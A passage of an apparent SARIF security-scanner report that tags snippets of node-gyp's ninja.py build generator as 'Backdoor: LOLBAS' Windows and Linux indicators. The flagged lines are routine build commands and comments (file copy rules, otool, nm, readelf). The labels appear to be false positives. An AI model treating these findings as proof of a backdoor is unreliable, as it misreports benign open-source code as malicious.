                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1305,
                  "startColumn": 11,
                  "endLine": 1305,
                  "endColumn": 16,
                  "snippet": {
                    "text": "                \"m\": \"objc\",\n                \"mm\": \"objcxx\",\n            }\n            cmd = map.get(lang)\n            ninja_file.build(gch, cmd, input, variables=[(var_name, lang_flag)])\n\n    def WriteLink(self, spec, config_name, config, link_deps, compile_deps):\n",
                    "rendered": {
                      "text": "                \"m\": \"objc\",\n                \"mm\": \"objcxx\",\n            }\n            cmd = map.get(lang)\n            ninja_file.build(gch, cmd, input, variables=[(var_name, lang_flag)])\n\n    def WriteLink(self, spec, config_name, config, link_deps, compile_deps):\n",
                      "markdown": "`                \"m\": \"objc\",\n                \"mm\": \"objcxx\",\n            }\n            cmd = map.get(lang)\n            ninja_file.build(gch, cmd, input, variables=[(var_name, lang_flag)])\n\n    def WriteLink(self, spec, config_name, config, link_deps, compile_deps):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1086,
                  "startColumn": 25,
                  "endLine": 1086,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            cflags_c = self.msvs_settings.GetCflagsC(config_name)\n            cflags_cc = self.msvs_settings.GetCflagsCC(config_name)\n            extra_defines = self.msvs_settings.GetComputedDefines(config_name)\n            # See comment at cc_command for why there's two .pdb files.\n            pdbpath_c = pdbpath_cc = self.msvs_settings.GetCompilerPdbName(\n                config_name, self.ExpandSpecial\n            )\n",
                    "rendered": {
                      "text": "            cflags_c = self.msvs_settings.GetCflagsC(config_name)\n            cflags_cc = self.msvs_settings.GetCflagsCC(config_name)\n            extra_defines = self.msvs_settings.GetComputedDefines(config_name)\n            # See comment at cc_command for why there's two .pdb files.\n            pdbpath_c = pdbpath_cc = self.msvs_settings.GetCompilerPdbName(\n                config_name, self.ExpandSpecial\n            )\n",
                      "markdown": "`            cflags_c = self.msvs_settings.GetCflagsC(config_name)\n            cflags_cc = self.msvs_settings.GetCflagsCC(config_name)\n            extra_defines = self.msvs_settings.GetComputedDefines(config_name)\n            # See comment at cc_command for why there's two .pdb files.\n            pdbpath_c = pdbpath_cc = self.msvs_settings.GetCompilerPdbName(\n                config_name, self.ExpandSpecial\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 926,
                  "startColumn": 7,
                  "endLine": 926,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        It assumes that the assets catalogs define at least one imageset and\n        thus an Assets.car file will be generated in the application resources\n        directory. If this is not the case, then the build will probably be done\n        at each invocation of ninja.\"\"\"\n        if not xcassets:\n            return\n\n",
                    "rendered": {
                      "text": "        It assumes that the assets catalogs define at least one imageset and\n        thus an Assets.car file will be generated in the application resources\n        directory. If this is not the case, then the build will probably be done\n        at each invocation of ninja.\"\"\"\n        if not xcassets:\n            return\n\n",
                      "markdown": "`        It assumes that the assets catalogs define at least one imageset and\n        thus an Assets.car file will be generated in the application resources\n        directory. If this is not the case, then the build will probably be done\n        at each invocation of ninja.\"\"\"\n        if not xcassets:\n            return\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 923,
                  "startColumn": 50,
                  "endLine": 923,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        \"\"\"Writes ninja edges for 'mac_bundle_resources' .xcassets files.\n\n        This add an invocation of 'actool' via the 'mac_tool.py' helper script.\n        It assumes that the assets catalogs define at least one imageset and\n        thus an Assets.car file will be generated in the application resources\n        directory. If this is not the case, then the build will probably be done\n        at each invocation of ninja.\"\"\"\n",
                    "rendered": {
                      "text": "        \"\"\"Writes ninja edges for 'mac_bundle_resources' .xcassets files.\n\n        This add an invocation of 'actool' via the 'mac_tool.py' helper script.\n        It assumes that the assets catalogs define at least one imageset and\n        thus an Assets.car file will be generated in the application resources\n        directory. If this is not the case, then the build will probably be done\n        at each invocation of ninja.\"\"\"\n",
                      "markdown": "`        \"\"\"Writes ninja edges for 'mac_bundle_resources' .xcassets files.\n\n        This add an invocation of 'actool' via the 'mac_tool.py' helper script.\n        It assumes that the assets catalogs define at least one imageset and\n        thus an Assets.car file will be generated in the application resources\n        directory. If this is not the case, then the build will probably be done\n        at each invocation of ninja.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 39,
                  "endLine": 190,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n\n# A small discourse on paths as used within the Ninja build:\n# All files we produce (both at gyp and at build time) appear in the\n# build directory (e.g. out/Debug).\n#\n# Paths within a given .gyp file are always relative to the directory\n",
                    "rendered": {
                      "text": "\n\n# A small discourse on paths as used within the Ninja build:\n# All files we produce (both at gyp and at build time) appear in the\n# build directory (e.g. out/Debug).\n#\n# Paths within a given .gyp file are always relative to the directory\n",
                      "markdown": "`\n\n# A small discourse on paths as used within the Ninja build:\n# All files we produce (both at gyp and at build time) appear in the\n# build directory (e.g. out/Debug).\n#\n# Paths within a given .gyp file are always relative to the directory\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 28,
                  "endLine": 190,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n\n# A small discourse on paths as used within the Ninja build:\n# All files we produce (both at gyp and at build time) appear in the\n# build directory (e.g. out/Debug).\n#\n# Paths within a given .gyp file are always relative to the directory\n",
                    "rendered": {
                      "text": "\n\n# A small discourse on paths as used within the Ninja build:\n# All files we produce (both at gyp and at build time) appear in the\n# build directory (e.g. out/Debug).\n#\n# Paths within a given .gyp file are always relative to the directory\n",
                      "markdown": "`\n\n# A small discourse on paths as used within the Ninja build:\n# All files we produce (both at gyp and at build time) appear in the\n# build directory (e.g. out/Debug).\n#\n# Paths within a given .gyp file are always relative to the directory\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 77,
                  "endLine": 43,
                  "snippet": {
                    "text": "    # ninja/shell variable) that are passed to gyp here but expanded\n    # before writing out into the target .ninja files; see\n    # ExpandSpecial.\n    # $! is used for variables that represent a path and that can only appear at\n    # the start of a string, while $| is used for variables that can appear\n    # anywhere in a string.\n    \"INTERMEDIATE_DIR\": \"$!INTERMEDIATE_DIR\",\n    \"SHARED_INTERMEDIATE_DIR\": \"$!PRODUCT_DIR/gen\",\n",
                    "rendered": {
                      "text": "    # ninja/shell variable) that are passed to gyp here but expanded\n    # before writing out into the target .ninja files; see\n    # ExpandSpecial.\n    # $! is used for variables that represent a path and that can only appear at\n    # the start of a string, while $| is used for variables that can appear\n    # anywhere in a string.\n    \"INTERMEDIATE_DIR\": \"$!INTERMEDIATE_DIR\",\n    \"SHARED_INTERMEDIATE_DIR\": \"$!PRODUCT_DIR/gen\",\n",
                      "markdown": "`    # ninja/shell variable) that are passed to gyp here but expanded\n    # before writing out into the target .ninja files; see\n    # ExpandSpecial.\n    # $! is used for variables that represent a path and that can only appear at\n    # the start of a string, while $| is used for variables that can appear\n    # anywhere in a string.\n    \"INTERMEDIATE_DIR\": \"$!INTERMEDIATE_DIR\",\n    \"SHARED_INTERMEDIATE_DIR\": \"$!PRODUCT_DIR/gen\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 11,
                  "endLine": 36,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    \"SHARED_LIB_PREFIX\": \"lib\",\n    # Gyp expects the following variables to be expandable by the build\n    # system to the appropriate locations.  Ninja prefers paths to be\n    # known at gyp time.  To resolve this, introduce special\n    # variables starting with $! and $| (which begin with a $ so gyp knows it\n    # should be treated specially, but is otherwise an invalid\n    # ninja/shell variable) that are passed to gyp here but expanded\n",
                    "rendered": {
                      "text": "    \"SHARED_LIB_PREFIX\": \"lib\",\n    # Gyp expects the following variables to be expandable by the build\n    # system to the appropriate locations.  Ninja prefers paths to be\n    # known at gyp time.  To resolve this, introduce special\n    # variables starting with $! and $| (which begin with a $ so gyp knows it\n    # should be treated specially, but is otherwise an invalid\n    # ninja/shell variable) that are passed to gyp here but expanded\n",
                      "markdown": "`    \"SHARED_LIB_PREFIX\": \"lib\",\n    # Gyp expects the following variables to be expandable by the build\n    # system to the appropriate locations.  Ninja prefers paths to be\n    # known at gyp time.  To resolve this, introduce special\n    # variables starting with $! and $| (which begin with a $ so gyp knows it\n    # should be treated specially, but is otherwise an invalid\n    # ninja/shell variable) that are passed to gyp here but expanded\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2855,
                  "startColumn": 61,
                  "endLine": 2855,
                  "endColumn": 69,
                  "snippet": {
                    "text": "\n    if target_short_names:\n        # Write a short name to build this target.  This benefits both the\n        # \"build chrome\" case as well as the gyp tests, which expect to be\n        # able to run actions and build libraries by their short name.\n        master_ninja.newline()\n        master_ninja.comment(\"Short names for targets.\")\n",
                    "rendered": {
                      "text": "\n    if target_short_names:\n        # Write a short name to build this target.  This benefits both the\n        # \"build chrome\" case as well as the gyp tests, which expect to be\n        # able to run actions and build libraries by their short name.\n        master_ninja.newline()\n        master_ninja.comment(\"Short names for targets.\")\n",
                      "markdown": "`\n    if target_short_names:\n        # Write a short name to build this target.  This benefits both the\n        # \"build chrome\" case as well as the gyp tests, which expect to be\n        # able to run actions and build libraries by their short name.\n        master_ninja.newline()\n        master_ninja.comment(\"Short names for targets.\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2763,
                  "startColumn": 66,
                  "endLine": 2763,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        master_ninja.rule(\n            \"copy\",\n            description=\"COPY $in $out\",\n            command=\"ln -f $in $out 2>/dev/null || (rm -rf $out && cp -af $in $out)\",\n        )\n    master_ninja.newline()\n\n",
                    "rendered": {
                      "text": "        master_ninja.rule(\n            \"copy\",\n            description=\"COPY $in $out\",\n            command=\"ln -f $in $out 2>/dev/null || (rm -rf $out && cp -af $in $out)\",\n        )\n    master_ninja.newline()\n\n",
                      "markdown": "`        master_ninja.rule(\n            \"copy\",\n            description=\"COPY $in $out\",\n            command=\"ln -f $in $out 2>/dev/null || (rm -rf $out && cp -af $in $out)\",\n        )\n    master_ninja.newline()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2757,
                  "startColumn": 35,
                  "endLine": 2757,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        master_ninja.rule(\n            \"copy\",\n            description=\"COPY $in $out\",\n            command=\"rm -rf $out && cp -fRP $in $out\",\n        )\n    else:\n        master_ninja.rule(\n",
                    "rendered": {
                      "text": "        master_ninja.rule(\n            \"copy\",\n            description=\"COPY $in $out\",\n            command=\"rm -rf $out && cp -fRP $in $out\",\n        )\n    else:\n        master_ninja.rule(\n",
                      "markdown": "`        master_ninja.rule(\n            \"copy\",\n            description=\"COPY $in $out\",\n            command=\"rm -rf $out && cp -fRP $in $out\",\n        )\n    else:\n        master_ninja.rule(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2639,
                  "startColumn": 48,
                  "endLine": 2639,
                  "endColumn": 54,
                  "snippet": {
                    "text": "            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n\n",
                    "rendered": {
                      "text": "            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n\n",
                      "markdown": "`            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2639,
                  "startColumn": 30,
                  "endLine": 2639,
                  "endColumn": 35,
                  "snippet": {
                    "text": "            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n\n",
                    "rendered": {
                      "text": "            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n\n",
                      "markdown": "`            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2638,
                  "startColumn": 49,
                  "endLine": 2638,
                  "endColumn": 55,
                  "snippet": {
                    "text": "            \"fi\"\n            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n",
                    "rendered": {
                      "text": "            \"fi\"\n            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n",
                      "markdown": "`            \"fi\"\n            % {\n                \"solink\": solink_base,\n                \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\",\n            }\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2628,
                  "startColumn": 28,
                  "endLine": 2628,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            # Always force dependent targets to relink if this library\n            # reexports something. Handling this correctly would require\n            # recursive TOC dumping but this is rare in practice, so punt.\n            \"otool -l $lib | grep -q LC_REEXPORT_DYLIB ; then \"\n            \"%(solink)s && %(extract_toc)s > $lib.TOC; \"\n            \"else \"\n            \"%(solink)s && %(extract_toc)s > $lib.tmp && \"\n",
                    "rendered": {
                      "text": "            # Always force dependent targets to relink if this library\n            # reexports something. Handling this correctly would require\n            # recursive TOC dumping but this is rare in practice, so punt.\n            \"otool -l $lib | grep -q LC_REEXPORT_DYLIB ; then \"\n            \"%(solink)s && %(extract_toc)s > $lib.TOC; \"\n            \"else \"\n            \"%(solink)s && %(extract_toc)s > $lib.tmp && \"\n",
                      "markdown": "`            # Always force dependent targets to relink if this library\n            # reexports something. Handling this correctly would require\n            # recursive TOC dumping but this is rare in practice, so punt.\n            \"otool -l $lib | grep -q LC_REEXPORT_DYLIB ; then \"\n            \"%(solink)s && %(extract_toc)s > $lib.TOC; \"\n            \"else \"\n            \"%(solink)s && %(extract_toc)s > $lib.tmp && \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2615,
                  "startColumn": 52,
                  "endLine": 2615,
                  "endColumn": 58,
                  "snippet": {
                    "text": "                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n        )\n",
                    "rendered": {
                      "text": "                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n        )\n",
                      "markdown": "`                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2615,
                  "startColumn": 34,
                  "endLine": 2615,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n        )\n",
                    "rendered": {
                      "text": "                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n        )\n",
                      "markdown": "`                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2614,
                  "startColumn": 53,
                  "endLine": 2614,
                  "endColumn": 59,
                  "snippet": {
                    "text": "                \"rm -f $lib $lib.TOC && lipo -create $in -output $lib$postbuilds &&\"\n                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n",
                    "rendered": {
                      "text": "                \"rm -f $lib $lib.TOC && lipo -create $in -output $lib$postbuilds &&\"\n                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n",
                      "markdown": "`                \"rm -f $lib $lib.TOC && lipo -create $in -output $lib$postbuilds &&\"\n                \"%(extract_toc)s > $lib.TOC\"\n                % {\n                    \"extract_toc\": \"{ otool -l $lib | grep LC_ID_DYLIB -A 5; \"\n                    \"nm -gP $lib | cut -f1-2 -d' ' | grep -v U$$; true; }\"\n                }\n            ),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2525,
                  "startColumn": 40,
                  "endLine": 2525,
                  "endColumn": 45,
                  "snippet": {
                    "text": "                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n                \"extract_toc\": (\n                    \"{ $readelf -d $lib | grep SONAME ; \"\n                    \"$nm -gD -f p $lib | cut -f1-2 -d' '; }\"\n                ),\n            }\n        )\n",
                    "rendered": {
                      "text": "                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n                \"extract_toc\": (\n                    \"{ $readelf -d $lib | grep SONAME ; \"\n                    \"$nm -gD -f p $lib | cut -f1-2 -d' '; }\"\n                ),\n            }\n        )\n",
                      "markdown": "`                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n                \"extract_toc\": (\n                    \"{ $readelf -d $lib | grep SONAME ; \"\n                    \"$nm -gD -f p $lib | cut -f1-2 -d' '; }\"\n                ),\n            }\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2524,
                  "startColumn": 41,
                  "endLine": 2524,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            % {\n                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n                \"extract_toc\": (\n                    \"{ $readelf -d $lib | grep SONAME ; \"\n                    \"$nm -gD -f p $lib | cut -f1-2 -d' '; }\"\n                ),\n            }\n",
                    "rendered": {
                      "text": "            % {\n                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n                \"extract_toc\": (\n                    \"{ $readelf -d $lib | grep SONAME ; \"\n                    \"$nm -gD -f p $lib | cut -f1-2 -d' '; }\"\n                ),\n            }\n",
                      "markdown": "`            % {\n                \"solink\": \"$ld -shared $ldflags -o $lib -Wl,-soname=$soname %(suffix)s\",\n                \"extract_toc\": (\n                    \"{ $readelf -d $lib | grep SONAME ; \"\n                    \"$nm -gD -f p $lib | cut -f1-2 -d' '; }\"\n                ),\n            }\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2519,
                  "startColumn": 48,
                  "endLine": 2519,
                  "endColumn": 52,
                  "snippet": {
